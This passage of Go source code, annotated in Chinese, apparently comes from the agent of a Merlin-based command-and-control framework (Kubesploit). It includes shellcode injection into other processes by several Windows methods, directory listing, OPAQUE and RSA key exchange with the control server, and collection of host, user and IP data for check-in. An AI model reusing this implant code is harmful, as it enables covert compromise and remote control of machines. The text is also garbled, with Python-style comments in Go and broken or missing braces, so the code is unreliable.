            # 如果执行成功且设置了详细输出
            if a.Verbose {
                # 输出成功信息
                message("success", "Shellcode was successfully executed")
            }
        }
        # 返回执行结果
        return err
    } 
    # 如果 shellcode 的执行方法是 "remote"
    else if shellcode.Method == "remote" {
        # 执行远程 shellcode
        err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
        # 如果执行出错
        if err != nil {
            # 如果设置了详细输出
            if a.Verbose {
                # 输出警告信息，包括执行的 shellcode 内容和错误信息
                message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
                message("warn", fmt.Sprintf("Error: %s", err.Error()))
            }
        } else {
            # 如果执行成功且设置了详细输出
            if a.Verbose {
                # 输出成功信息
                message("success", "Shellcode was successfully executed")
            }
        }
        # 返回执行结果
        return err
    } 
    # 如果 shellcode 的执行方法是 "rtlcreateuserthread"
    else if shellcode.Method == "rtlcreateuserthread" {
        # 执行 RTLCreateUserThread shellcode
        err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
        # 如果执行出错
        if err != nil {
            # 如果设置了详细输出
            if a.Verbose {
                # 输出警告信息，包括执行的 shellcode 内容和错误信息
                message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
                message("warn", fmt.Sprintf("Error: %s", err.Error()))
            }
        } else {
            # 如果执行成功且设置了详细输出
            if a.Verbose {
                # 输出成功信息
                message("success", "Shellcode was successfully executed")
            }
        }
        # 返回执行结果
        return err
    // 如果 shellcode 的执行方法是 "userapc"
    } else if shellcode.Method == "userapc" {
        // 执行 shellcode，并将结果赋给 err
        err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
        // 如果执行出错
        if err != nil {
            // 如果设置了详细输出
            if a.Verbose {
                // 输出警告信息，包括执行的 shellcode 内容和错误信息
                message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
                message("warn", fmt.Sprintf("Error: %s", err.Error()))
            }
        } else {
            // 如果设置了详细输出
            if a.Verbose {
                // 输出成功执行的信息
                message("success", "Shellcode was successfully executed")
            }
        }
        // 返回执行结果
        return err
    } else {
        // 如果设置了详细输出
        if a.Verbose {
            // 输出警告信息，包括无效的 shellcode 执行方法
            message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
        }
        // 返回错误信息，包括无效的 shellcode 执行方法
        return fmt.Errorf("invalid shellcode execution method %s", shellcode.Method)
    }
}
// 列出指定路径下的文件和目录
func (a *Agent) list(path string) (string, error) {
    // 如果启用了调试模式，输出调试信息
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))
    // 如果启用了详细模式，输出详细信息
    } else if a.Verbose {
        message("success", fmt.Sprintf("listing directory contents for: %s", path))
    }
    // 将相对路径解析为绝对路径
    aPath, errPath := filepath.Abs(path)
    if errPath != nil {
        return "", errPath
    }
    // 读取目录下的文件和目录信息
    files, err := ioutil.ReadDir(aPath)
    if err != nil {
        return "", err
    }
    // 构建目录列表的详细信息
    details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)
    for _, f := range files {
        perms := f.Mode().String()
        size := strconv.FormatInt(f.Size(), 10)
        modTime := f.ModTime().String()[0:19]
        name := f.Name()
        details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
    }
    return details, nil
}

// opaqueRegister 用于执行 OPAQUE 密码认证密钥交换（PAKE）协议的注册
func (a *Agent) opaqueRegister() error {
    // 如果启用了详细模式，输出提示信息
    if a.Verbose {
        message("note", "Starting OPAQUE Registration")
    }
    // 构建 OPAQUE 用户注册初始化
    userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
    userRegInit := userReg.Init(a.pwdU)
    // 如果启用了调试模式，输出调试信息
    if a.Debug {
        message("debug", fmt.Sprintf("OPAQUE UserID: %x", userRegInit.UserID))
        message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
        message("debug", fmt.Sprintf("OPAQUE PwdU: %x", a.pwdU))
    }
    // 将用户注册初始化消息转换为字节流
    userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
    if errUserRegInitBytes != nil {
        return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
    }
    // 待发送到服务器的消息
    // 创建一个消息基础结构体，包括版本、ID、类型、载荷和填充
    regInitBase := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "RegInit",
        Payload: userRegInitBytes,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 使用预共享密钥（PSK）计算SHA256哈希值，作为JWT和JWE加密密钥的密钥
    k := sha256.Sum256([]byte(a.psk))
    a.secret = k[:]

    // 使用预认证预共享密钥创建JWT；在认证后由服务器更新
    agentJWT, errJWT := a.getJWT()
    if errJWT != nil {
        return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE registration:\r\n%s", errJWT)
    }
    a.JWT = agentJWT

    // 发送消息并获取注册初始化响应
    regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)

    if errRegInitResp != nil {
        return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
    }

    // 检查响应消息类型是否为"RegInit"
    if regInitResp.Type != "RegInit" {
        return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration initialization", regInitResp.Type)
    }

    // 解析服务器注册初始化消息并存储在serverRegInit变量中
    var serverRegInit gopaque.ServerRegisterInit
    errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
    if errServerRegInit != nil {
        return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
    }

    // 如果Verbose标志为true，则输出接收到的OPAQUE服务器注册初始化消息
    if a.Verbose {
        message("note", "Received OPAQUE server registration initialization message")
    }

    // 如果Debug标志为true，则输出OPAQUE Beta、V和PubS的值
    if a.Debug {
        message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
        message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
        message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
    }

    // TODO: 扩展gopaque以运行RwdU通过n次PBKDF2迭代

    // 使用用户注册初始化消息完成用户注册
    userRegComplete := userReg.Complete(&serverRegInit)

    // 将用户注册完成消息转换为字节流
    userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
    // 如果用户注册完成消息的序列化出现错误，则返回错误信息
    if errUserRegCompleteBytes != nil {
        return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
    }

    // 如果处于调试模式，则输出用户注册完成消息的 EnvU 和 PubU
    if a.Debug {
        message("debug", fmt.Sprintf("OPAQUE EnvU: %x", userRegComplete.EnvU))
        message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
    }

    // 创建要发送到服务器的消息
    regCompleteBase := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "RegComplete",
        Payload: userRegCompleteBytes,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 发送注册完成消息并接收响应
    regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)

    // 如果发送注册完成消息出现错误，则返回错误信息
    if errRegCompleteResp != nil {
        return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
    }

    // 如果响应消息类型不是 "RegComplete"，则返回错误信息
    if regCompleteResp.Type != "RegComplete" {
        return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
    }

    // 如果处于详细模式，则输出提示信息
    if a.Verbose {
        message("note", "OPAQUE registration complete")
    }

    // 返回空，表示注册完成
    return nil
// opaqueAuthenticate用于使用OPAQUE密码认证密钥交换（PAKE）协议对代理进行身份验证
func (a *Agent) opaqueAuthenticate() error {

    if a.Verbose {
        message("note", "Starting OPAQUE Authentication")
    }

    // 1 - 创建一个带有嵌入式密钥交换的NewUserAuth
    userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
    userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)

    // 2 - 使用密码调用Init，并将生成的UserAuthInit发送到服务器
    userAuthInit, err := userAuth.Init(a.pwdU)
    if err != nil {
        return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
    }

    userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
    if errUserAuthInitBytes != nil {
        return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
    }

    // 要发送到服务器的消息
    authInitBase := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "AuthInit",
        Payload: userAuthInitBytes,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 从PSK设置JWT和JWE加密密钥的密钥
    k := sha256.Sum256([]byte(a.psk))
    a.secret = k[:]

    // 使用预身份验证预共享密钥创建JWT；在身份验证后由服务器更新
    agentJWT, errJWT := a.getJWT()
    if errJWT != nil {
        return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
    }
    a.JWT = agentJWT

    authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)

    if errAuthInitResp != nil {
        return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
    }
}
    // 当 Merlin 服务器重新启动但不知道代理时
    if authInitResp.Type == "ReRegister" {
        // 如果设置了详细输出，打印提示信息
        if a.Verbose {
            message("note", "Received OPAQUE ReRegister response, setting initial to false")
        }
        // 将 initial 设置为 false，并返回空值
        a.initial = false
        return nil
    }

    // 如果认证初始化响应的类型不是 "AuthInit"
    if authInitResp.Type != "AuthInit" {
        // 返回错误信息，说明响应中的消息类型无效
        return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
    }

    // 3 - 接收服务器的 ServerAuthComplete
    var serverComplete gopaque.ServerAuthComplete

    // 将服务器的 ServerAuthComplete 从字节流解析为对象
    errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
    if errServerComplete != nil {
        // 如果解析出错，返回错误信息
        return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
    }

    // 4 - 使用服务器的 ServerAuthComplete 调用 Complete 方法
    // 如果设置了详细输出，打印提示信息
    if a.Verbose {
        message("note", "Received OPAQUE server complete message")
    }

    // 如果设置了调试输出，打印调试信息
    if a.Debug {
        message("debug", fmt.Sprintf("OPAQUE Beta: %x", serverComplete.Beta))
        message("debug", fmt.Sprintf("OPAQUE V: %x", serverComplete.V))
        message("debug", fmt.Sprintf("OPAQUE PubS: %x", serverComplete.ServerPublicKey))
        message("debug", fmt.Sprintf("OPAQUE EnvU: %x", serverComplete.EnvU))
    }

    // 调用 Complete 方法，获取 UserAuthComplete 对象和错误信息
    _, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
    if errUserAuth != nil {
        // 如果出错，返回错误信息
        return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
    }

    // 将 UserAuthComplete 对象转换为字节流
    userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
    // 如果存在用户认证完成的错误字节，则返回错误信息
    if errUserAuthCompleteBytes != nil {
        return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
    }

    // 创建包含用户认证完成信息的基本消息
    authCompleteBase := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "AuthComplete",
        Payload: &userAuthCompleteBytes,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 保存 OPAQUE 导出的 Diffie-Hellman 密钥
    a.secret = []byte(userKex.SharedSecret.String())

    // 发送用户认证完成消息
    authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)

    // 如果发送消息时出现错误，则返回错误信息
    if errAuthCompleteResp != nil {
        return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
    }

    // 如果收到的认证完成响应中包含令牌，则将其保存到 JWT 中
    if authCompleteResp.Token != "" {
        a.JWT = authCompleteResp.Token
    }

    // 根据认证完成响应的类型进行不同的处理
    switch authCompleteResp.Type {
    case "ServerOk":
        // 如果是 "ServerOk" 类型的响应，并且设置了详细输出，则打印成功信息
        if a.Verbose {
            message("success", "Agent authentication successful")
        }
        // 如果设置了调试模式，则打印调试信息
        if a.Debug {
            message("debug", "Leaving agent.opaqueAuthenticate without error")
        }
        // 返回空，表示认证成功
        return nil
    default:
        // 如果收到了未知类型的认证完成响应，则返回错误信息
        return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
    }
// rsaKeyExchange 用于与服务器创建和交换 RSA 密钥
func (a *Agent) rsaKeyExchange() error {
    if a.Debug {
        message("debug", "Entering into rsaKeyExchange function")
    }

    // 创建 KeyExchange 结构体，包含公钥
    pk := messages.KeyExchange{
        PublicKey: a.RSAKeys.PublicKey,
    }

    // 创建 Base 结构体，包含版本号、ID、类型、Payload 和 Padding
    m := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "KeyExchange",
        Payload: pk,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 发送 KeyExchange 到服务器
    resp, reqErr := a.sendMessage("POST", m)

    // 如果发送过程中出现错误，返回错误信息
    if reqErr != nil {
        return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
    }

    // 处理服务器返回的 KeyExchange 响应
    _, errKeyExchange := a.messageHandler(resp)

    // 如果处理过程中出现错误，返回错误信息
    if errKeyExchange != nil {
        return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
    }

    if a.Debug {
        message("debug", "Leaving rsaKeyExchange function without error")
    }
    return nil
}

// getJWT 用于在向服务器发送第一条消息时发送未经身份验证的 JWT
func (a *Agent) getJWT() (string, error) {
    // 创建加密器
    encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
        jose.Recipient{
            Algorithm: jose.DIRECT, // 不创建每条消息的密钥
            Key:       a.secret},
        (&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
    if encErr != nil {
        return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
    }

    // 创建签名者
    signer, errSigner := jose.NewSigner(jose.SigningKey{
        Algorithm: jose.HS256,
        Key:       a.secret},
        (&jose.SignerOptions{}).WithType("JWT"))
    if errSigner != nil {
        return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
    }

    // 构建 JWT 声明
    # 创建 JWT 的声明对象，设置过期时间、签发时间和 ID
    cl := jwt.Claims{
        Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
        IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
        ID:       a.ID.String(),
    }

    # 使用签名者和加密者对声明进行签名和加密，得到序列化后的 JWT
    agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
    # 检查序列化过程中是否有错误，如果有则返回错误信息
    if err != nil {
        return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
    }

    # 解析 JWT 来检查是否有错误
    _, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
    # 如果解析过程中有错误，则返回错误信息
    if errParse != nil {
        return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
    }

    # 返回序列化后的 JWT
    return agentJWT, nil
// getAgentInfoMessage 用于将有关代理及其配置的信息放入消息中并返回
func (a *Agent) getAgentInfoMessage() messages.Base {
    // 创建系统信息消息对象
    sysInfoMessage := messages.SysInfo{
        Platform:     a.Platform,
        Architecture: a.Architecture,
        UserName:     a.UserName,
        UserGUID:     a.UserGUID,
        HostName:     a.HostName,
        Pid:          a.Pid,
        Ips:          a.Ips,
    }

    // 创建代理信息消息对象
    agentInfoMessage := messages.AgentInfo{
        Version:       kubesploitVersion.Version,
        Build:         build,
        WaitTime:      a.WaitTime.String(),
        PaddingMax:    a.PaddingMax,
        MaxRetry:      a.MaxRetry,
        FailedCheckin: a.FailedCheckin,
        Skew:          a.Skew,
        Proto:         a.Proto,
        SysInfo:       sysInfoMessage,
        KillDate:      a.KillDate,
        JA3:           a.JA3,
    }

    // 创建基础消息对象
    baseMessage := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "AgentInfo",
        Payload: agentInfoMessage,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
    }

    // 返回基础消息对象
    return baseMessage
}

// TODO 将此功能集中到一个包中，因为它在这里和服务器中都被使用
// message 用于在命令行打印消息
func message(level string, message string) {
    switch level {
    case "info":
        color.Cyan("[i]" + message)
    case "note":
        color.Yellow("[-]" + message)
    case "warn":
        color.Red("[!]" + message)
    case "debug":
        color.Red("[DEBUG]" + message)
    case "success":
        color.Green("[+]" + message)
    default:
        color.Red("[_-_]Invalid message level: " + message)
    }
}

// TODO 添加证书装订
// TODO 更新 Makefile 以仅为代理移除调试堆栈跟踪。GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// 添加一个标准函数，用于打印消息，类似于 JavaScript 代理中的方式。将其作为代理和服务器的库？
// 配置设置用户代理 agentcontrol 消息
```